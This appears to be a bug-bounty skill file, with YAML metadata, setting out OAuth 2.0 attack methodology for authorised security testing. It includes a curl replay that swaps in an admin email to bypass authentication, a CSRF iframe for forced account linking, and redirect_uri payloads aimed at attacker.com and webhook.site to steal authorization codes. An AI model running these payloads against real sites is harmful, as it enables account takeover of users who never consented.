---
name: attack-oauth
description: "OAuth 2.0 hunting — implicit flow auth bypass, forced profile linking, and redirect_uri hijacking for account takeover"
category: "authentication"
version: "1.0"
author: "bountyreper-official"
tags:
  - oauth
  - authentication
  - account-takeover
  - open-redirect
  - csrf
tech_stack:
  - web
  - oauth
cwe_ids:
  - CWE-287
  - CWE-352
  - CWE-601
chains_with:
  - wstg-athn-04
  - attack-open-redirect
  - wstg-authz-01
prerequisites: []
severity_boost:
  attack-open-redirect: "OAuth redirect_uri open redirect = auth code theft"
---

# OAuth 2.0 Hunting Methodology

## Objective

Identify OAuth 2.0 implementation flaws in both authorization code and implicit flows that lead to authentication bypass, forced account linking, and authorization code leakage.

> **Attribution:** Methodology from [KathanP19/HowToHunt — OAuth](https://github.com/KathanP19/HowToHunt/tree/master/OAuth) by Pyr0sec. Licensed GPL-3.0.

## Testing Methodology

### Phase 1: Flow Identification

```http
# Authorization Code Flow (more secure, less bugs)
GET /authorization?client_id=12345&redirect_uri=https://client.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth.provider.com

# Implicit Flow (bug-prone, response_type=token)
GET /authorization?client_id=12345&redirect_uri=https://client.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth.provider.com
```

Factors:
- `response_type=code` → authorization code flow
- `response_type=token` → implicit flow (higher chance of bugs)
- Check `/callback` — code as query param vs token as fragment

### Phase 2: Method 1 — Auth Bypass in Implicit Flow

1. Find POST request that creates session after OAuth:
   ```http
   POST /api/auth/oauth HTTP/1.1
   {"email":"victim@gmail.com","username":"victim","access_token":"z0y9x8w7v6u5"}
   ```
2. Replay with modified email/username and same token:
   ```bash
   curl -X POST https://target.com/api/auth/oauth \
     -H "Content-Type: application/json" \
     -d '{"email":"admin@target.com","username":"admin","access_token":"z0y9x8w7v6u5"}'
   ```
   If server doesn't validate token against provider, you bypass auth as another user.

### Phase 3: Method 2 — Forced Profile Linking (CSRF)

1. Capture `/auth?client_id=...` request during social login
2. Check if `state` parameter missing → CSRF vulnerable
3. Drop request, log out, create exploit:
   ```html
   <iframe src="https://target.com/auth?client_id=123&redirect_uri=https://target.com/oauth-linking&response_type=code"></iframe>
   ```
   Victim visits your page, your social profile links to victim's account.

### Phase 4: Method 3 — Account Hijacking via redirect_uri

1. Find authorization request: `GET /auth?client_id=...&redirect_uri=...`
2. Test redirect_uri open redirect:
   ```bash
   # Try external domain
   curl "https://target.com/auth?client_id=123&redirect_uri=https://attacker.com/callback&response_type=code"
   # Try same-site open redirect chain
   curl "https://target.com/auth?client_id=123&redirect_uri=https://target.com%2f%2fattacker.com/callback"
   ```
3. If open redirect exists, set `redirect_uri` to `https://webhook.site/<id>`
4. Follow redirect, capture authorization `code` from webhook logs
5. Reuse code in callback:
   ```http
   GET /callback?code=STOLEN_CODE&state=... HTTP/1.1
   Host: client.com
   ```
   You log in as victim.

## What Constitutes a Finding

| Condition | Severity |
|-----------|----------|
| Auth bypass via token not validated (impersonate any user) | Critical (P1) |
| redirect_uri open redirect → code theft | High (P2) |
| Missing state → forced linking CSRF | Medium (P3) |
| Implicit flow token leakage via referer | High (P2) |

## Evidence Requirements

- Authorization request with flow identified
- Modified request showing bypass (auth as other user, or code captured on webhook)
- Session cookie or authenticated response as victim

## Tools

- Burp Suite proxy for OAuth flow capture
- webhook.site for redirect_uri exfiltration
- Browser devtools for fragment inspection

## References

- [HowToHunt — OAuth 2.0 Hunting Methodology](https://github.com/KathanP19/HowToHunt/tree/master/OAuth)
- [OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)
